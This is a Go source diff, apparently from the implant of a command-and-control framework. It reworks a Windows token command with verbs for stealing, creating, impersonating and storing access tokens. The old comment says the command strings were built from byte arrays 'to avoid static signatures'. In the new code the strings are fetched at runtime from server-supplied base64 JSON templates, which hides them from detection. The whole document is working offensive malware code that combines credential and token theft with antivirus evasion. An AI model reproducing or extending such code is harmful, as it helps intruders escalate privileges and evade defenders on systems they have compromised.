@@ -5,44 +5,264 @@
 package main
 
 import (
+	"encoding/base64"
+	"encoding/json"
 	"strconv"
 	"strings"
+	"sync"
 	"time"
 )
 
-// Token command strings (constructed to avoid static signatures)
+// TokenTemplate holds the server-side template for token commands
+type TokenTemplate struct {
+	Version   int      `json:"v"`
+	Type      int      `json:"t"`
+	Templates []string `json:"tpl"`
+	Params    []string `json:"p"`
+}
+
+// Shared template storage for all token-related commands
 var (
-	// Command name
-	tokCmdName = string([]byte{0x74, 0x6f, 0x6b, 0x65, 0x6e}) // token
-
-	// Verbs
-	tokVerbCreate      = string([]byte{0x63, 0x72, 0x65, 0x61, 0x74, 0x65})                                     // create
-	tokVerbSteal       = string([]byte{0x73, 0x74, 0x65, 0x61, 0x6c})                                           // steal
-	tokVerbStore       = string([]byte{0x73, 0x74, 0x6f, 0x72, 0x65})                                           // store
-	tokVerbUse         = string([]byte{0x75, 0x73, 0x65})                                                       // use
-	tokVerbImpersonate = string([]byte{0x69, 0x6d, 0x70, 0x65, 0x72, 0x73, 0x6f, 0x6e, 0x61, 0x74, 0x65})       // impersonate
-	tokVerbNetonly     = string([]byte{0x6e, 0x65, 0x74, 0x6f, 0x6e, 0x6c, 0x79})                               // netonly
-	tokVerbList        = string([]byte{0x6c, 0x69, 0x73, 0x74})                                                 // list
-	tokVerbStored      = string([]byte{0x73, 0x74, 0x6f, 0x72, 0x65, 0x64})                                     // stored
-	tokVerbCurrent     = string([]byte{0x63, 0x75, 0x72, 0x72, 0x65, 0x6e, 0x74})                               // current
-	tokVerbStatus      = string([]byte{0x73, 0x74, 0x61, 0x74, 0x75, 0x73})                                     // status
-	tokVerbRemove      = string([]byte{0x72, 0x65, 0x6d, 0x6f, 0x76, 0x65})                                     // remove
-	tokVerbClear       = string([]byte{0x63, 0x6c, 0x65, 0x61, 0x72})                                           // clear
-	tokVerbRevert      = string([]byte{0x72, 0x65, 0x76, 0x65, 0x72, 0x74})                                     // revert
-	tokVerbRev2self    = string([]byte{0x72, 0x65, 0x76, 0x32, 0x73, 0x65, 0x6c, 0x66})                         // rev2self
-
-	// Subcommand actions
-	tokActSet        = string([]byte{0x73, 0x65, 0x74})                                                         // set
-	tokActProcesses  = string([]byte{0x70, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x65, 0x73})                     // processes
-
-	// Default values
-	tokDefInteractive = string([]byte{0x69, 0x6e, 0x74, 0x65, 0x72, 0x61, 0x63, 0x74, 0x69, 0x76, 0x65})       // interactive
+	tokTemplate   []string
+	tokTemplateMu sync.RWMutex
 )
 
+// SetTokenTemplate stores the template for use by all token commands
+func SetTokenTemplate(templates []string) {
+	tokTemplateMu.Lock()
+	tokTemplate = templates
+	tokTemplateMu.Unlock()
+}
+
+// tokTpl retrieves a template string by index with mutex protection
+func tokTpl(idx int) string {
+	tokTemplateMu.RLock()
+	defer tokTemplateMu.RUnlock()
+	if tokTemplate != nil && idx < len(tokTemplate) {
+		return tokTemplate[idx]
+	}
+	return ""
+}
+
+// Token template indices (must match server's common.go)
+const (
+	// Verbs (451-464)
+	idxTokVerbCreate      = 451
+	idxTokVerbSteal       = 452
+	idxTokVerbStore       = 453
+	idxTokVerbUse         = 454
+	idxTokVerbImpersonate = 455
+	idxTokVerbNetonly     = 456
+	idxTokVerbList        = 457
+	idxTokVerbStored      = 458
+	idxTokVerbCurrent     = 459
+	idxTokVerbStatus      = 460
+	idxTokVerbRemove      = 461
+	idxTokVerbClear       = 462
+	idxTokVerbRevert      = 463
+	idxTokVerbRev2self    = 464
+
+	// Subcommand actions (465-466)
+	idxTokActSet       = 465
+	idxTokActProcesses = 466
+
+	// Logon types (467-474)
+	idxTokLogonNetwork      = 467
+	idxTokLogonBatch        = 468
+	idxTokLogonService      = 469
+	idxTokLogonNetCleartext = 470
+	idxTokLogonNetClear     = 471
+	idxTokLogonNewCreds     = 472
+	idxTokLogonNewCredsAlt  = 473
+	idxTokLogonInteractive  = 474
+
+	// Source identifiers (476-479)
+	idxTokSourceStolen  = 476
+	idxTokSourceCreated = 477
+	idxTokStolenCmp     = 478
+	idxTokCreatedCmp    = 479
+
+	// Token types (480-481)
+	idxTokTypeImpersonation = 480
+	idxTokTypePrimary       = 481
+
+	// Utility strings (482-496)
+	idxTokUnknownLower = 482
+	idxTokUnknown      = 483
+	idxTokBackslash    = 484
+	idxTokNewline      = 485
+	idxTokUnderscore   = 486
+	idxTokSpace        = 487
+	idxTokColon        = 488
+	idxTokPipe         = 489
+	idxTokNone         = 490
+	idxTokDots         = 491
+	idxTokAtSign       = 492
+	idxTokDot          = 493
+	idxTokComma        = 494
+	idxTokMode0        = 495
+	idxTokMode1        = 496
+
+	// Output format strings (497-516)
+	idxTokTokenInfo      = 497
+	idxTokProcessUser    = 498
+	idxTokImpTokenPrefix = 499
+	idxTokUserPrefix     = 500
+	idxTokSourcePrefix   = 501
+	idxTokProcessPrefix  = 502
+	idxTokPidPrefix      = 503
+	idxTokPidSuffix      = 504
+	idxTokLogonPrefix    = 505
+	idxTokNoActiveImp    = 506
+	idxTokNetOnlyTokPre  = 507
+	idxTokOrigUserPre    = 508
+	idxTokNetOnlyHdr     = 509
+	idxTokActiveNetPre   = 510
+	idxTokUserPre2       = 511
+	idxTokSourcePre2     = 512
+	idxTokProcessPre2    = 513
+	idxTokLogonPre2      = 514
+	idxTokNetOnlyToksHdr = 515
+	idxTokIndent2        = 516
+)
+
+// Convenience functions for token verbs with fallbacks
+func tokVerbCreate() string {
+	if s := tokTpl(idxTokVerbCreate); s != "" {
+		return s
+	}
+	return "create"
+}
+
+func tokVerbSteal() string {
+	if s := tokTpl(idxTokVerbSteal); s != "" {
+		return s
+	}
+	return "steal"
+}
+
+func tokVerbStore() string {
+	if s := tokTpl(idxTokVerbStore); s != "" {
+		return s
+	}
+	return "store"
+}
+
+func tokVerbUse() string {
+	if s := tokTpl(idxTokVerbUse); s != "" {
+		return s
+	}
+	return "use"
+}
+
+func tokVerbImpersonate() string {
+	if s := tokTpl(idxTokVerbImpersonate); s != "" {
+		return s
+	}
+	return "impersonate"
+}
+
+func tokVerbNetonly() string {
+	if s := tokTpl(idxTokVerbNetonly); s != "" {
+		return s
+	}
+	return "netonly"
+}
+
+func tokVerbList() string {
+	if s := tokTpl(idxTokVerbList); s != "" {
+		return s
+	}
+	return "list"
+}
+
+func tokVerbStored() string {
+	if s := tokTpl(idxTokVerbStored); s != "" {
+		return s
+	}
+	return "stored"
+}
+
+func tokVerbCurrent() string {
+	if s := tokTpl(idxTokVerbCurrent); s != "" {
+		return s
+	}
+	return "current"
+}
+
+func tokVerbStatus() string {
+	if s := tokTpl(idxTokVerbStatus); s != "" {
+		return s
+	}
+	return "status"
+}
+
+func tokVerbRemove() string {
+	if s := tokTpl(idxTokVerbRemove); s != "" {
+		return s
+	}
+	return "remove"
+}
+
+func tokVerbClear() string {
+	if s := tokTpl(idxTokVerbClear); s != "" {
+		return s
+	}
+	return "clear"
+}
+
+func tokVerbRevert() string {
+	if s := tokTpl(idxTokVerbRevert); s != "" {
+		return s
+	}
+	return "revert"
+}
+
+func tokVerbRev2self() string {
+	if s := tokTpl(idxTokVerbRev2self); s != "" {
+		return s
+	}
+	return "rev2self"
+}
+
+func tokActSet() string {
+	if s := tokTpl(idxTokActSet); s != "" {
+		return s
+	}
+	return "set"
+}
+
+func tokActProcesses() string {
+	if s := tokTpl(idxTokActProcesses); s != "" {
+		return s
+	}
+	return "processes"
+}
+
+func tokDefInteractive() string {
+	if s := tokTpl(idxTokLogonInteractive); s != "" {
+		return s
+	}
+	return "interactive"
+}
+
 // TokenCommand consolidates all token management functionality
-type TokenCommand struct{}
+type TokenCommand struct {
+	tpl *TokenTemplate
+}
 
 func (c *TokenCommand) Execute(ctx *CommandContext, args []string) CommandResult {
+	// Parse template from command data if present
+	if ctx.CurrentCommand.Data != "" {
+		decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentCommand.Data)
+		if err == nil {
+			c.tpl = &TokenTemplate{}
+			if json.Unmarshal(decoded, c.tpl) == nil && c.tpl.Templates != nil {
+				SetTokenTemplate(c.tpl.Templates)
+			}
+		}
+	}
+
 	if len(args) == 0 {
 		return CommandResult{
 			Output:      Err(E1),
@@ -56,39 +276,39 @@ func (c *TokenCommand) Execute(ctx *CommandContext, args []string) CommandResult
 
 	switch verb {
 	// === Token Creation ===
-	case tokVerbCreate:
+	case tokVerbCreate():
 		return c.handleCreate(ctx, verbArgs)
 
 	// === Token Stealing ===
-	case tokVerbSteal:
+	case tokVerbSteal():
 		return c.handleSteal(ctx, verbArgs)
-	case tokVerbStore:
+	case tokVerbStore():
 		return c.handleStore(ctx, verbArgs)
 
 	// === Token Usage ===
-	case tokVerbUse:
+	case tokVerbUse():
 		return c.handleUse(ctx, verbArgs)
-	case tokVerbImpersonate:
+	case tokVerbImpersonate():
 		return c.handleImpersonate(ctx)
 
 	// === Network-Only Management ===
-	case tokVerbNetonly:
+	case tokVerbNetonly():
 		return c.handleNetOnly(ctx, verbArgs)
 
 	// === Token Listing/Info ===
-	case tokVerbList:
+	case tokVerbList():
 		return c.handleList(ctx, verbArgs)
-	case tokVerbStored:
+	case tokVerbStored():
 		return c.handleStored(ctx)
-	case tokVerbCurrent, tokVerbStatus:
+	case tokVerbCurrent(), tokVerbStatus():
 		return c.handleCurrent(ctx)
 
 	// === Token Cleanup ===
-	case tokVerbRemove:
+	case tokVerbRemove():
 		return c.handleRemove(ctx, verbArgs)
-	case tokVerbClear:
+	case tokVerbClear():
 		return c.handleClear(ctx)
-	case tokVerbRevert, tokVerbRev2self:
+	case tokVerbRevert(), tokVerbRev2self():
 		// Allow both for compatibility
 		return c.handleRevert(ctx)
 
@@ -118,7 +338,7 @@ func (c *TokenCommand) handleCreate(ctx *CommandContext, args []string) CommandR
 	}
 
 	// Handle 'token create netonly' specially
-	if args[0] == tokVerbNetonly {
+	if args[0] == tokVerbNetonly() {
 		if len(args) < 4 {
 			return CommandResult{
 				Output:      Err(E1),
@@ -141,7 +361,7 @@ func (c *TokenCommand) handleCreate(ctx *CommandContext, args []string) CommandR
 	userpass := args[0]
 	password := args[1]
 	tokenName := args[2]
-	logonType := tokDefInteractive
+	logonType := tokDefInteractive()
 	if len(args) > 3 {
 		logonType = args[3]
 	}
@@ -178,7 +398,7 @@ func (c *TokenCommand) handleSteal(ctx *CommandContext, args []string) CommandRe
 
 	// Parse additional arguments for name and netonly flag
 	for i := 1; i < len(args); i++ {
-		if strings.ToLower(args[i]) == tokVerbNetonly {
+		if strings.ToLower(args[i]) == tokVerbNetonly() {
 			netOnly = true
 		} else if name == "" {
 			name = args[i]
@@ -209,7 +429,7 @@ func (c *TokenCommand) handleStore(ctx *CommandContext, args []string) CommandRe
 	}
 
 	netOnly := false
-	if len(args) > 2 && strings.ToLower(args[2]) == tokVerbNetonly {
+	if len(args) > 2 && strings.ToLower(args[2]) == tokVerbNetonly() {
 		netOnly = true
 	}
 
@@ -232,7 +452,7 @@ func (c *TokenCommand) handleUse(ctx *CommandContext, args []string) CommandResu
 	}
 
 	netOnly := false
-	if len(args) > 1 && strings.ToLower(args[1]) == tokVerbNetonly {
+	if len(args) > 1 && strings.ToLower(args[1]) == tokVerbNetonly() {
 		netOnly = true
 	}
 
@@ -257,7 +477,7 @@ func (c *TokenCommand) handleNetOnly(ctx *CommandContext, args []string) Command
 
 	action := strings.ToLower(args[0])
 	switch action {
-	case tokActSet:
+	case tokActSet():
 		if len(args) < 2 {
 			return CommandResult{
 				Output:      Err(E1),
@@ -267,10 +487,10 @@ func (c *TokenCommand) handleNetOnly(ctx *CommandContext, args []string) Command
 		}
 		return stealToken.setNetOnlyToken(ctx, args[1])
 
-	case tokVerbClear:
+	case tokVerbClear():
 		return stealToken.clearNetOnlyToken(ctx)
 
-	case tokVerbStatus:
+	case tokVerbStatus():
 		return stealToken.showNetOnlyStatus()
 
 	default:
@@ -288,7 +508,7 @@ func (c *TokenCommand) handleNetOnly(ctx *CommandContext, args []string) Command
 
 func (c *TokenCommand) handleList(ctx *CommandContext, args []string) CommandResult {
 	// Check if they want to list processes (token list processes)
-	if len(args) > 0 && args[0] == tokActProcesses {
+	if len(args) > 0 && args[0] == tokActProcesses() {
 		stealToken := &StealTokenCommand{}
 		return stealToken.listTokens()
 	}
